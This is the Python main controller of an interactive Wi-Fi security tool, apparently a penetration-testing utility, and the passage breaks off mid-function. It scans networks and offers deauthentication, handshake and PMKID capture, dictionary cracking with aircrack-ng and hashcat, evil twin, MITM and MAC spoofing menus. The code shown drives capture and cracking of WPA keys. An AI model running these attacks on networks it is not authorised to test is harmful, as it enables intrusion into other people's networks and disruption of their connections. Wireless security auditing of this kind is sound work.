"""Interactive Wi-Fi security analysis application (main controller)."""

from __future__ import annotations

import asyncio
import base64
import concurrent.futures
import csv
import gc
import glob
import io
import ipaddress
import json
import os
import random
import re
import select
import shutil
import shlex
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
import traceback
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from itertools import islice
from pathlib import Path

import netifaces
import nmap
from bleak import BleakScanner
from rich import box
from rich.box import ROUNDED
from rich.console import Console, Group
from rich.layout import Layout
from rich.live import Live
from rich.markdown import Markdown
from rich.panel import Panel
from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
from rich.prompt import Prompt
from rich.style import Style
from rich.table import Row, Table
from rich.text import Text
from rich.tree import Tree
from scapy.all import *
from zeroconf import ServiceBrowser, Zeroconf

from adapters.system_tools import (
    CommandRunner,
    DOWNLOAD_TEST_BYTES,
    UPLOAD_TEST_BYTES,
    WiFiAdapterManager,
    arp_lookup_command,
    bettercap_command,
    bettercap_stdin_eval_command,
    build_speed_recommendations,
    bytes_to_mbytes_per_second,
    curl_download_command,
    curl_upload_command,
    download_speed_rating,
    estimate_upload_mbytes_per_second,
    fallback_upload_mbytes_per_second,
    mbytes_to_mbits,
    parse_mac_from_arp_output,
    parse_ping_stats,
    ping_command,
    ping_probe_command,
    speed_gauge_blocks,
    upload_speed_rating,
)
from app.logger import Logger
from attacks.commands import (
    aircrack_check,
    aircrack_crack,
    aireplay_deauth,
    airodump_capture,
    hashcat_crack,
    hcxdumptool_capture,
    hcxpcapngtool_convert,
    hcxpcapngtool_info,
)
from attacks.parsers import (
    extract_hashcat_password_for_bssid,
    extract_wifi_password,
    has_aircrack_handshake,
    is_valid_wifi_password,
    parse_aircrack_network_info,
)
from cleanup import resolve_evil_twin_log_dir
from config import (
    AUTO_HACK_SESSIONS_DIR,
    CHANNELS_2GHZ,
    CHANNELS_5GHZ,
    DEFAULT_WORDLIST,
    HANDSHAKE_DIR,
    ROCKYOU_WORDLIST,
    TMP_DIR,
    WIFI_ANGEL_SESSION_BINARIES,
)
from wifi.packets import (
    get_security_info as packet_get_security_info,
    parse_client_observation,
    parse_network_observation,
)


class WiFiAngel:
    def __init__(self):
        if os.geteuid() != 0:
            print("[bold red]❌ Root privileges are required to run WiFiAngel.[/]")
            sys.exit(1)

        self.console = Console()
        self.networks = {}
        self.clients = {}
        self.interface_name = None
        self.selected_network = None
        self.scanning = False
        self.current_menu = "main"
        self.layout = Layout()
        self.live = Live("", console=self.console, auto_refresh=False)
        self.logger = Logger()
        self.command_runner = CommandRunner(logger=self.logger)
        self.wifi_adapter = WiFiAdapterManager(self.command_runner)
        
        banner = """[blue]
╔══════════════════ WiFiAngel 2025 ══════════════════╗
║                                                    ║
║    [red]🛡️  WiFiAngel[/]                                    ║
║                                                    ║
╚═════════ Wireless Network Analysis Tool ═══════════╝

[white]Developed by[/] [yellow]Cuma KURT[/]  [white]cumakurt@gmail.com[/]
[white]https://www.linkedin.com/in/cuma-kurt-34414917/[/]
"""
        self.console.print(banner)
        
        try:
            required_tools = list(WIFI_ANGEL_SESSION_BINARIES)
            missing_tools = self.wifi_adapter.missing_tools(required_tools)
            
            if missing_tools:
                self.console.print(f"[bold red]❌ Missing required tools: {', '.join(missing_tools)}[/]")
                self.console.print("[yellow]Please install the missing tools using:[/]")
                self.console.print("[white]sudo apt install aircrack-ng hashcat hcxdumptool[/]")
                sys.exit(1)

            wifi_interfaces = self.wifi_adapter.list_wireless_interfaces()
            
            if not wifi_interfaces:
                self.console.print(
                    "[bold red]No Wi-Fi interfaces were detected.[/]\n"
                    "[yellow]Checks:[/]\n"
                    " • Is this a VM? Pass the USB Wi-Fi dongle or PCI device through to the guest.\n"
                    " • Run [white]ip link[/] and [white]iw dev[/] — you should see a [white]wlan*[/] device.\n"
                    " • Optional: [white]sudo apt install wireless-tools[/] if [white]iwconfig[/] is missing.\n"
                    " • Some containers/WSL environments do not expose wireless hardware."
                )
                raise RuntimeError(
                    "No wireless network adapter found (see messages above)."
                )
            
            if len(wifi_interfaces) > 1:
                self.console.print("\n[yellow]Multiple wireless interfaces found:[/]")
                for i, iface in enumerate(wifi_interfaces, 1):
                    self.console.print(f"{i}. {iface}")
                choice = Prompt.ask("Select interface number", choices=[str(i) for i in range(1, len(wifi_interfaces)+1)])
                self.interface_name = wifi_interfaces[int(choice)-1]
            else:
                self.interface_name = wifi_interfaces[0]
                
            self.console.print(f"[bold green]✓ WiFi adapter initialized successfully: {self.interface_name}[/]")
            self.logger.info(f"WiFi adapter initialized: {self.interface_name}")
            
        except Exception as e:
            self.logger.error(f"Could not initialize WiFi adapter: {str(e)}")
            self.console.print(f"[bold red]❌ Could not initialize WiFi adapter: {str(e)}[/]")
            sys.exit(1)

    def create_header(self):
        return Panel(
            "[bold red]WiFiAngel[/] - [bold blue]Wireless Network Analysis Tool[/]",
            style="white on black"
        )
        
    def start_monitor_mode(self):
        try:
            self.console.print("[bold green]Starting monitor mode...[/]")
            self.logger.info("Starting monitor mode")

            original_interface = self.interface_name
            self.interface_name = self.wifi_adapter.start_monitor_mode(self.interface_name)
            self.logger.info(f"{original_interface} switched to monitor mode")
            
            self.console.print(f"[bold green]Monitor mode active: {self.interface_name}[/]")
            self.logger.info(f"Monitor mode active: {self.interface_name}")
            return True
        except Exception as e:
            self.logger.error(f"Could not start monitor mode: {str(e)}")
            self.console.print(f"[bold red]Error: {str(e)}[/]")
            return False

    def _channel_hopper(self):
        while self.scanning:
            try:
                for channel in CHANNELS_2GHZ:
                    if not self.scanning:
                        break
                    try:
                        self.command_runner.set_wireless_channel(self.interface_name, channel)
                        time.sleep(0.08)
                    except:
                        continue

                for channel in CHANNELS_5GHZ:
                    if not self.scanning:
                        break
                    try:
                        self.command_runner.set_wireless_channel(self.interface_name, channel)
                        time.sleep(0.08)
                    except:
                        continue
            except Exception as e:
                self.logger.error(f"Channel hopping error: {str(e)}")
                time.sleep(0.1)

    def _packet_sniffer(self):
        while self.scanning:
            try:
                sniff(iface=self.interface_name, 
                     prn=self.packet_handler, 
                     store=0,
                     timeout=0.3,
                     count=150)
            except Exception as e:
                if self.scanning:
                    self.logger.error(f"Sniffing error: {str(e)}")
                time.sleep(0.1)

    def _results_updater(self):
        while self.scanning:
            try:
                if self.networks:
                    self.print_results()
                time.sleep(0.3)
            except Exception as e:
                self.logger.error(f"Results update error: {str(e)}")
                time.sleep(0.1)

    def scan_networks(self):
        self.logger.info("Starting network scan")
        self.live.start()
        
        if not hasattr(self, '_networks_lock'):
            self._networks_lock = threading.Lock()
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = []
            futures.append(executor.submit(self._channel_hopper))
            futures.append(executor.submit(self._packet_sniffer))
            futures.append(executor.submit(self._results_updater))
            
            try:
                while self.scanning:
                    time.sleep(0.1)
                    for future in futures:
                        if future.done() and future.exception():
                            self.logger.error(f"Scan thread error: {future.exception()}")
                            self.scanning = False
                            break
            except KeyboardInterrupt:
                self.scanning = False
                self.console.print("\n[bold yellow]Stopping network scan...[/]")
            finally:
                self.live.stop()
                for future in futures:
                    try:
                        future.result(timeout=1.0)
                    except:
                        pass
                self.logger.info("Network scan stopped")
                gc.collect()

    def packet_handler(self, pkt):
        try:
            network_observation = parse_network_observation(pkt)
            if network_observation:
                with self._networks_lock:
                    bssid = network_observation.bssid
                    if bssid not in self.networks:
                        self.networks[bssid] = {
                            'ssid': network_observation.ssid,
                            'signal': network_observation.signal,
                            'cipher': "/".join(network_observation.security),
                            'clients': set(),
                            'channel': network_observation.channel,
                            'first_seen': datetime.now(),
                            'last_seen': datetime.now(),
                            'packets': 1,
                            'data_packets': 0,
                            'wps': network_observation.wps
                        }
                        self.logger.debug(f"New network found: {network_observation.ssid} ({bssid})")
                    else:
                        self.networks[bssid].update({
                            'last_seen': datetime.now(),
                            'signal': network_observation.signal,
                            'packets': self.networks[bssid]['packets'] + 1
                        })
            
            else:
                client_observation = parse_client_observation(pkt)
                if not client_observation:
                    return

                with self._networks_lock:
                    bssid = client_observation.bssid
                    if bssid in self.networks:
                        self.networks[bssid]['data_packets'] += 1
                        
                        src = client_observation.src
                        dst = client_observation.dst
                        
                        if src and src != bssid and src not in self.networks[bssid]['clients']:
                            self.networks[bssid]['clients'].add(src)
                            self.logger.debug(f"New client found: {src} -> {self.networks[bssid]['ssid']}")
                        
                        if dst and dst != bssid and dst not in self.networks[bssid]['clients']:
                            self.networks[bssid]['clients'].add(dst)
                            self.logger.debug(f"New client found: {dst} -> {self.networks[bssid]['ssid']}")

        except Exception as e:
            self.logger.error(f"Packet processing error: {str(e)}")

    def get_security(self, pkt):
        """Determines security type"""
        return "/".join(packet_get_security_info(pkt))

    def print_results(self):
        """Shows results in table format"""
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("No")
        table.add_column("BSSID")
        table.add_column("SSID")
        table.add_column("Channel")
        table.add_column("Security")
        table.add_column("Signal")
        table.add_column("Clients")

        for idx, (bssid, data) in enumerate(self.networks.items(), 1):
            table.add_row(
                str(idx),
                bssid,
                data['ssid'],
                str(data['channel']),
                data['cipher'],
                str(data['signal']),
                str(len(data['clients']))
            )

        # Update Live display
        self.live.update(table)
        self.live.refresh()

    def show_main_menu(self):
        """Shows the main menu"""
        self.current_menu = "main"
        while True:
            try:
                self.console.print("\n[bold yellow]Main Menu[/]")
                self.console.print("1. 📡 Start Monitor Mode")
                if self.scanning:
                    self.console.print("[bold green]🔍 Network Scan Active[/]")
                self.console.print("2. 🔍 Start/Stop Network Scan")
                self.console.print("3. 🎯 Select Target Network")
                self.console.print("4. ⚔️ Attack Techniques")
                self.console.print("5. 🔧 Tools")
                self.console.print("6. 🚀 Auto Hack")
                self.console.print("0. ❌ Exit")
                
                choice = Prompt.ask("Select an option")
                self.logger.info(f"Main menu selection: {choice}")
                
                if choice == "1":
                    if not self.start_monitor_mode():
                        continue
                elif choice == "2":
                    # Check if monitor mode is active
                    if not self.interface_name.endswith("mon"):
                        self.console.print("[bold yellow]⚠️ Monitor mode is not active![/]")
                        self.console.print("[bold blue]Enabling monitor mode automatically...[/]")
                        if not self.start_monitor_mode():
                            self.console.print("[bold red]❌ Failed to enable monitor mode. Please try again.[/]")
                            continue
                    
                    self.scanning = not self.scanning
                    if self.scanning:
                        scan_thread = threading.Thread(target=self.scan_networks)
                        scan_thread.daemon = True
                        scan_thread.start()
                        self.console.print("[bold green]Network scan started. Press Ctrl+C to stop.[/]")
                    else:
                        self.console.print("[bold yellow]Stopping network scan...[/]")
                elif choice == "3":
                    self.select_target_network()
                elif choice == "4":
                    self.current_menu = "attack"
                    self.show_attack_menu()
                elif choice == "5":
                    self.current_menu = "tools"
                    self.show_tools_menu()
                elif choice == "6":
                    self.auto_hack()
                elif choice == "0":
                    if self.scanning:
                        self.console.print("[bold yellow]Stopping network scan...[/]")
                        self.scanning = False
                        time.sleep(1)
                    self.logger.info("Program shutting down...")
                    self.cleanup_and_exit()

            except KeyboardInterrupt:
                if self.scanning:
                    self.scanning = False
                    self.console.print("\n[bold yellow]Stopping network scan...[/]")
                    time.sleep(1)
                    continue
                else:
                    if self.current_menu == "main":
                        self.logger.info("Program shutting down...")
                        self.cleanup_and_exit()
                    else:
                        self.logger.info("Returning to main menu")
                        self.console.print("\n[bold yellow]Returning to main menu...[/]")
                        self.current_menu = "main"
                        continue

    def show_attack_menu(self):
        """Shows attack techniques menu"""
        while True:
            if self.selected_network:
                network = self.networks[self.selected_network]
                self.console.print(Panel(f"[bold cyan]Selected Network: {network['ssid']} ({self.selected_network})[/]"))
            
            self.console.print("\n[bold yellow]Attack Techniques:[/]")
            self.console.print("1. 📦 WPA/WPA2/WPA3 Handshake Capture")
            self.console.print("2. ⚡ Deauthentication Attack")
            self.console.print("3. 🔑 PMKID Attack")
            self.console.print("4. 📚 Dictionary Attack")
            self.console.print("5. 🎮 Hybrid Attack (Handshake + PMKID)")
            self.console.print("6. 🔄 WPS Attack")
            self.console.print("7. 🕵️ Evil Twin Attack")
            self.console.print("8. 🔮 Man in the Middle Attack")
            self.console.print("0. ↩️ Back to Main Menu")
            
            choice = Prompt.ask("Select an option")
            
            if choice == "1":
                self.capture_handshake()
            elif choice == "2":
                self.show_deauth_menu()
            elif choice == "3":
                self.pmkid_attack()
            elif choice == "4":
                self.dictionary_attack()
            elif choice == "5":
                self.hybrid_attack()
            elif choice == "6":
                self.wps_attack()
            elif choice == "7":
                self.evil_twin_attack()
            elif choice == "8":
                self.mitm_attack()
            elif choice == "0":
                self.current_menu = "main"
                return

    def show_tools_menu(self):
        """Shows tools menu"""
        while True:
            self.console.print("\n[bold yellow]Tools:[/]")
            self.console.print("1. 📡 WiFi Adapter Settings")
            self.console.print("2. 📊 Network Statistics")
            self.console.print("3. 📱 Client Analysis")
            self.console.print("4. 🌐 MAC Address Changer")
            self.console.print("5. 🔍 WiFi Signal Analyzer")
            self.console.print("6. 📶 Channel Optimizer")
            self.console.print("7. 🛡️ Security Audit")
            self.console.print("8. 🕵️ WiFi Hidden SSID Discovery")
            self.console.print("9. 🔎 Bluetooth & IoT Scanner")
            self.console.print("10. ⚡ Network Speed Test")
            self.console.print("0. ↩️ Back to Main Menu")
            
            choice = Prompt.ask("Select an option")
            
            if choice == "1":
                self.wifi_adapter_settings()
            elif choice == "2":
                self.show_network_stats()
            elif choice == "3":
                self.client_analysis()
            elif choice == "4":
                self.mac_changer()
            elif choice == "5":
                self.signal_analyzer()
            elif choice == "6":
                self.channel_optimizer()
            elif choice == "7":
                self.security_audit()
            elif choice == "8":
                self.hidden_ssid_discovery()
            elif choice == "9":
                self.bluetooth_iot_scanner()
            elif choice == "10":
                self.speed_test()
            elif choice == "0":
                break

    def show_deauth_menu(self):
        """Shows deauthentication attack menu"""
        while True:
            self.console.print("\n[bold yellow]Deauthentication Attack:[/]")
            self.console.print("1. 🌐 All Clients Attack")
            self.console.print("2. 🎯 Single Client Attack")
            self.console.print("0. ↩️ Back")
            
            choice = Prompt.ask("Select an option")
            
            if choice == "1":
                self.deauth_all_clients()
            elif choice == "2":
                self.deauth_single_client()
            elif choice == "0":
                break

    def wifi_adapter_settings(self):
        """WiFi adapter settings menu"""
        while True:
            self.console.print("\n[bold yellow]WiFi Adapter Settings:[/]")
            self.console.print(f"Current Adapter: {self.interface_name}")
            self.console.print("1. 📡 Change Adapter Mode")
            self.console.print("2. 📶 Change Channel")
            self.console.print("3. 📊 Adapter Information")
            self.console.print("0. ↩️ Back")
            
            choice = Prompt.ask("Select an option")
            
            if choice == "1":
                self.change_adapter_mode()
            elif choice == "2":
                self.change_channel()
            elif choice == "3":
                self.show_adapter_info()
            elif choice == "0":
                break

    def change_adapter_mode(self):
        """Changes adapter mode menu"""
        self.console.print("\n[bold yellow]Adapter Mode:[/]")
        self.console.print("1. Monitor Mode")
        self.console.print("2. Managed Mode")
        self.console.print("0. Back")
        
        choice = Prompt.ask("Select an option")
        
        try:
            if choice == "1":
                self.interface_name = self.wifi_adapter.start_monitor_mode(self.interface_name)
                self.console.print(f"[bold green]Monitor mode activated on {self.interface_name}![/]")
                self.logger.info(f"Monitor mode activated on {self.interface_name}")
            elif choice == "2":
                self.console.print("[bold yellow]Switching to managed mode...[/]")
                self.interface_name = self.wifi_adapter.set_managed_mode(self.interface_name)
                time.sleep(2)

                # Verify the mode change
                try:
                    iw_info = subprocess.check_output(["iwconfig", self.interface_name], stderr=subprocess.STDOUT).decode()
                    if "Mode:Managed" in iw_info:
                        self.console.print(f"[bold green]Successfully switched to managed mode: {self.interface_name}[/]")
                        self.logger.info(f"Switched to managed mode: {self.interface_name}")
                    else:
                        self.console.print("[bold yellow]Warning: Interface might not be in managed mode[/]")
                except Exception as e:
                    self.console.print(f"[bold red]Error verifying interface mode: {str(e)}[/]")
        except Exception as e:
            self.console.print(f"[bold red]Error: {str(e)}[/]")

    def change_channel(self):
        """Changes channel"""
        channel = Prompt.ask("Enter new channel number (1-14 or 36-165)")
        try:
            interface_name = self.interface_name
            channel = int(channel)
            self.command_runner.set_wireless_channel(interface_name, channel)
            self.console.print(f"[bold green]Channel changed to {channel}![/]")
        except ValueError:
            self.console.print("[bold red]Invalid channel number![/]")

    def show_adapter_info(self):
        """Shows adapter information"""
        try:
            interface_name = self.interface_name
            info = subprocess.check_output(["iwconfig", interface_name]).decode()
            self.console.print(Panel(info, title="Adapter Information", border_style="blue"))
        except Exception as e:
            self.console.print(f"[bold red]Error: {str(e)}[/]")

    def mac_changer(self):
        """Change or restore the active adapter MAC address."""
        if self.command_runner.which("macchanger") is None:
            self.console.print("[bold red]macchanger is not installed![/]")
            self.console.print("[yellow]Install it with: sudo apt install macchanger[/]")
            return

        def apply_macchanger(args):
            self.console.print(f"[bold blue]Updating MAC address for {self.interface_name}...[/]")
            self.wifi_adapter.set_link_down(self.interface_name)
            result = self.command_runner.run(
                ["macchanger", *args, self.interface_name],
                capture_output=True,
            )
            self.wifi_adapter.set_link_up(self.interface_name)

            output = result.stdout.strip() or result.stderr.strip()
            if result.ok:
                self.console.print(Panel(output, title="MAC Changer", border_style="green"))
                self.logger.info(f"MAC address updated on {self.interface_name}")
            else:
                self.console.print(Panel(output or "macchanger failed", title="MAC Changer Error", border_style="red"))
                self.logger.error(f"MAC address change failed on {self.interface_name}: {output}")

        while True:
            self.console.print("\n[bold yellow]MAC Address Changer[/]")
            self.console.print(f"Current Adapter: {self.interface_name}")
            self.console.print("1. Show Current MAC")
            self.console.print("2. Set Random MAC")
            self.console.print("3. Set Custom MAC")
            self.console.print("4. Restore Permanent MAC")
            self.console.print("0. Back")

            choice = Prompt.ask("Select an option", choices=["0", "1", "2", "3", "4"])

            if choice == "0":
                return
            if choice == "1":
                result = self.command_runner.run(
                    ["macchanger", "-s", self.interface_name],
                    capture_output=True,
                )
                self.console.print(Panel(result.stdout.strip() or result.stderr.strip(), title="Current MAC", border_style="blue"))
            elif choice == "2":
                apply_macchanger(["-r"])
            elif choice == "3":
                custom_mac = Prompt.ask("Enter custom MAC address")
                if not re.match(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$", custom_mac):
                    self.console.print("[bold red]Invalid MAC address format![/]")
                    continue
                apply_macchanger(["-m", custom_mac])
            elif choice == "4":
                apply_macchanger(["-p"])

    def pmkid_attack(self):
        """PMKID attack"""
        if not self.selected_network:
            self.console.print("[bold red]Please select a target network first![/]")
            return

        network = self.networks[self.selected_network]
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        # Ensure handshake directory exists
        handshake_dir = HANDSHAKE_DIR
        if not handshake_dir.exists():
            self.console.print("[bold yellow]Creating handshake directory...[/]")
            handshake_dir.mkdir(exist_ok=True)
        
        # Store PMKID files in handshake directory
        output_file = handshake_dir / f"pmkid_{network['ssid']}_{timestamp}"
        output_pcapng = output_file.with_suffix(".pcapng")
        output_hash = output_file.with_suffix(".22000")
        pmkid_found = False
        start_time = time.time()

        def create_status_table():
            """Creates and updates status table with current information"""
            current_time = time.time()
            elapsed = int(current_time - start_time)
            
            hours = elapsed // 3600
            minutes = (elapsed % 3600) // 60
            seconds = elapsed % 60
            elapsed_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
            
            # Create main table
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("BSSID", style="cyan")
            table.add_column("Channel", style="green")
            table.add_column("ESSID", style="yellow")
            table.add_column("Clients", style="cyan")
            table.add_column("Status", style="green")
            table.add_column("Time Elapsed", style="yellow")

            status = "[bold green]PMKID Found! (Continuing...)" if pmkid_found else "[bold yellow]Capturing..."
            table.add_row(
                self.selected_network,
                str(network['channel']),
                network['ssid'],
                str(len(network['clients'])),
                status,
                elapsed_str
            )

            return table

        try:
            self.console.print("\n[bold yellow]Important Information:[/]")
            self.console.print("[bold cyan]- PMKID capture will continue until you press Ctrl+C")
            self.console.print("[bold cyan]- If a PMKID is found, it will be saved but the process will continue\n")

            with Live(refresh_per_second=4) as live:
                # Start PMKID capture
                process = subprocess.Popen(
                    hcxdumptool_capture(self.interface_name, output_pcapng),
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                )

                while True:
                    # Update status display
                    live.update(create_status_table())

                    # Check if PMKID is captured
                    if output_pcapng.exists():
                        # Extract hash from pcapng
                        subprocess.run(hcxpcapngtool_convert(output_hash, output_pcapng), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        
                        if output_hash.exists() and output_hash.stat().st_size > 0 and not pmkid_found:
                            pmkid_found = True
                            self.console.print(f"\n[bold green]PMKID captured successfully! Saved to: {output_hash}[/]")
                            self.console.print("[bold yellow]Continuing capture process... Press Ctrl+C to stop.[/]")

                    time.sleep(0.25)

        except KeyboardInterrupt:
            self.console.print("\n[bold yellow]PMKID attack stopped by user.[/]")
        finally:
            if 'process' in locals():
                try:
                    process.terminate()
                    process.wait(timeout=2)
                except:
                    process.kill()
                
            if pmkid_found:
                self.console.print(f"\n[bold green]PMKID attack completed successfully. File saved to: {output_hash}[/]")
            else:
                self.console.print("\n[bold yellow]PMKID attack completed without capturing PMKID.[/]")
                
            self.logger.info(f"PMKID attack completed: {'Successful' if pmkid_found else 'Failed'}")
            # Ensure menu state is properly reset
            self.current_menu = "attack"

    def _read_wordlist_in_chunks(self, wordlist_path, chunk_size=1000):
        """Read wordlist file in chunks to optimize memory usage"""
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                while True:
                    chunk = list(islice(f, chunk_size))
                    if not chunk:
                        break
                    yield chunk
        except Exception as e:
            self.logger.error(f"Error reading wordlist: {str(e)}")
            yield []

    def dictionary_attack(self):
        """Optimized dictionary attack with wordlist"""
        if not self.selected_network and not HANDSHAKE_DIR.exists():
            self.console.print("[bold red]Please select a target network first![/]")
            return

        network = self.networks[self.selected_network] if self.selected_network else None
        
        # Check if network is WPA3
        is_wpa3 = False
        if network and 'security' in network:
            if isinstance(network['security'], str) and "WPA3" in network['security']:
                is_wpa3 = True
            elif isinstance(network['security'], list) and any("WPA3" in sec for sec in network['security']):
                is_wpa3 = True
        
        self.console.print("\n[bold yellow]Dictionary Attack:[/]")
        self.console.print("1. 📦 Use Handshake File")
        self.console.print("2. 🔑 Use PMKID File")
        if is_wpa3:
            self.console.print("3. 🛡️ Use WPA3 SAE Hash")
        self.console.print("0. ↩️ Back")
        
        choice = Prompt.ask("Select an option")
        
        if choice == "0":
            return
        elif choice == "1":
            # Use Handshake File for dictionary attack
            handshake_dir = HANDSHAKE_DIR
            if not handshake_dir.exists():
                self.console.print("[bold yellow]Creating handshake directory...[/]")
                handshake_dir.mkdir(exist_ok=True)
                self.console.print("[bold red]No handshake files found! Capture a handshake first.[/]")
                return
                
            # Check for existing handshake files
            handshake_files = list(handshake_dir.glob("*.cap"))
            if not handshake_files:
                self.console.print("[bold red]No handshake files found in 'handshake' directory![/]")
                return
                
            # List available handshake files
            self.console.print("\n[bold green]Available Handshake Files:[/]")
            for idx, file in enumerate(handshake_files, 1):
                # Check if file contains handshake
                result = subprocess.run(aircrack_check(file), capture_output=True, text=True)
                status = "[green]✓ Valid" if has_aircrack_handshake(result.stdout) else "[red]✗ Invalid"
                self.console.print(f"{idx}. {file.name} - {status}")
                
            # Let user select handshake file
            file_choice = Prompt.ask("\nSelect handshake file (0 to cancel)", choices=["0"] + [str(i) for i in range(1, len(handshake_files) + 1)])
            if file_choice == "0":
                return
                
            selected_file = handshake_files[int(file_choice) - 1]
            
            # Verify selected file has handshake
            result = subprocess.run(aircrack_check(selected_file), capture_output=True, text=True)
            if not has_aircrack_handshake(result.stdout):
                self.console.print(f"[bold red]Selected file does not contain a valid handshake![/]")
                return
        
        elif choice == "2":
            # Use PMKID File for dictionary attack
            handshake_dir = HANDSHAKE_DIR
            if not handshake_dir.exists():
                self.console.print("[bold yellow]Creating handshake directory...[/]")
                handshake_dir.mkdir(exist_ok=True)
            
            # Check for PMKID files in the handshake directory
            self.console.print("\n[bold yellow]PMKID File Options:[/]")
            self.console.print("1. Select from captured PMKID files")
            self.console.print("2. Specify custom PMKID file path")
            self.console.print("0. Cancel")
            
            pmkid_option = Prompt.ask("Choose PMKID option", choices=["0", "1", "2"])
            
            if pmkid_option == "0":
                return
            elif pmkid_option == "1":
                # List PMKID files from handshake directory
                pmkid_files = list(handshake_dir.glob("*.22000")) + list(handshake_dir.glob("pmkid_*.pcapng"))
                
                if not pmkid_files:
                    self.console.print("[bold red]No PMKID files found in 'handshake' directory![/]")
                    return
                
                self.console.print("\n[bold green]Available PMKID Files:[/]")
                for idx, file in enumerate(pmkid_files, 1):
                    self.console.print(f"{idx}. {file.name}")
                
                file_choice = Prompt.ask("\nSelect PMKID file (0 to cancel)", choices=["0"] + [str(i) for i in range(1, len(pmkid_files) + 1)])
                if file_choice == "0":
                    return
                
                selected_file = pmkid_files[int(file_choice) - 1]
                
                # If file is pcapng, convert to 22000 format
                if selected_file.suffix == '.pcapng':
                    output_file = selected_file.with_suffix('.22000')
                    self.console.print(f"[bold blue]Converting PCAPNG to hashcat format...[/]")
                    subprocess.run(hcxpcapngtool_convert(output_file, selected_file), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    if not output_file.exists() or os.path.getsize(str(output_file)) == 0:
                        self.console.print(f"[bold red]Failed to convert PMKID file to hashcat format![/]")
                        return
                    
                    selected_file = output_file
            else:  # pmkid_option == "2"
                # Specify custom PMKID file path
                file_path = Prompt.ask("Enter path to PMKID file (absolute or relative path)")
                selected_file = Path(file_path)
                
                if not selected_file.exists():
                    self.console.print(f"[bold red]File not found: {selected_file}[/]")
                    return
                
                # If file is pcapng, convert to 22000 format
                if selected_file.suffix.lower() == '.pcapng':
                    output_file = selected_file.with_suffix('.22000')
                    self.console.print(f"[bold blue]Converting PCAPNG to hashcat format...[/]")
                    subprocess.run(hcxpcapngtool_convert(output_file, selected_file), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    if not output_file.exists() or os.path.getsize(str(output_file)) == 0:
                        self.console.print(f"[bold red]Failed to convert PMKID file to hashcat format![/]")
                        return
                    
                    selected_file = output_file
        
        # Continue with shared code for both options
        # Ask for wordlist
        self.console.print("\n[bold yellow]Select Wordlist:[/]")
        self.console.print(f"1. Use default wordlist ({DEFAULT_WORDLIST})")
        self.console.print(f"2. Use rockyou wordlist ({ROCKYOU_WORDLIST})")
        self.console.print("3. Specify custom wordlist path")
        wordlist_choice = Prompt.ask("Choose wordlist option", choices=["1", "2", "3"])
        
        if wordlist_choice == "1":
            wordlist = str(DEFAULT_WORDLIST)
            if not os.path.exists(wordlist):
                self.console.print(f"[bold red]Default wordlist not found: {wordlist}[/]")
                return
        elif wordlist_choice == "2":
            wordlist = str(ROCKYOU_WORDLIST)
            if not os.path.exists(wordlist):
                self.console.print(f"[bold red]Rockyou wordlist not found: {wordlist}[/]")
                return
        else:
            wordlist = Prompt.ask("Enter path to wordlist")
            if not os.path.exists(wordlist):
                self.console.print(f"[bold red]Wordlist not found: {wordlist}[/]")
                return
        
        # Start the cracking process with visual progress display
        self.console.print(f"\n[bold green]Starting dictionary attack against: {selected_file.name}[/]")
        self.console.print(f"[bold blue]Using wordlist: {wordlist}[/]")
        self.console.print("[bold yellow]This process may take some time. Press Ctrl+C to stop.[/]")
        
        start_time = time.time()
        password_found = False
        last_progress = 0
        last_speed = "0 k/s"
        last_tested_keys = 0
        total_keys = 0
        eta = "Unknown"
        current_key = ""
        process = None  # Define process here so we can access it in finally block
        
        # Create a function to update the status display
        def create_status_display():
            # Create a simple progress bar with just percent completion
            progress_percent = last_progress / 100
            filled_length = int(50 * progress_percent)
            empty_length = 50 - filled_length
            
            if progress_percent < 0.3:
                color = "bright_red"
            elif progress_percent < 0.6:
                color = "bright_yellow"
            elif progress_percent < 0.9:
                color = "bright_green"
            else:
                color = "bright_blue"
                
            # Only show progress bar, don't use panel
            progress_bar = f"[{color}]{'━' * filled_length}[/][dim]{'╍' * empty_length}[/] [bold {color}]{last_progress:.2f}%[/]"
            
            return progress_bar
        
        # Run aircrack-ng in real-time with output processing
        # Add -a 2 parameter to specify WPA/WPA2 attack mode
        # Add -q for quieter output (less verbose)
        # Add -e to specify the ESSID if known
        bssid = None
        essid = None
        is_wpa3 = False
        
        # Get network info from handshake if possible
        try:
            aircrack_result = subprocess.run(aircrack_check(selected_file),
                                          capture_output=True, text=True)
            
            network_info = parse_aircrack_network_info(aircrack_result.stdout)
            if network_info:
                bssid = network_info.bssid
                essid = network_info.essid
                is_wpa3 = network_info.is_wpa3
                if is_wpa3:
                    self.console.print("[bold blue]WPA3 network detected[/]")
                self.logger.info(f"Extracted from handshake - BSSID: {bssid}, ESSID: {essid}, WPA3: {is_wpa3}")
        except Exception as e:
            self.logger.error(f"Error extracting network info: {str(e)}")
            
                # Construct command with all needed parameters
        if choice == "2":
            # For PMKID, we use hashcat mode 16800
            cmd = hashcat_crack(selected_file, wordlist, mode=16800, workload=3, force=True)
            self.console.print("[bold blue]Using hashcat for PMKID cracking (mode 16800)[/]")
        elif is_wpa3:
            # For WPA3, we use hashcat instead for better compatibility
            cmd = hashcat_crack(selected_file, wordlist, mode=22000, workload=3, force=True)
            self.console.print("[bold blue]Using hashcat for WPA3 handshake cracking[/]")
        else:
            # Standard WPA/WPA2 attack with aircrack-ng
            valid_essid = essid if essid and essid != "ESSID" and "Encryption" not in essid else None
            cmd = aircrack_crack(selected_file, wordlist, valid_essid)
            if valid_essid:
                self.console.print(f"[bold blue]Using network ESSID: {essid}[/]")

        try:
            # Add extra parameters to make output format more organized
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,  # Redirect stderr to stdout
                text=True,
                bufsize=1
            )
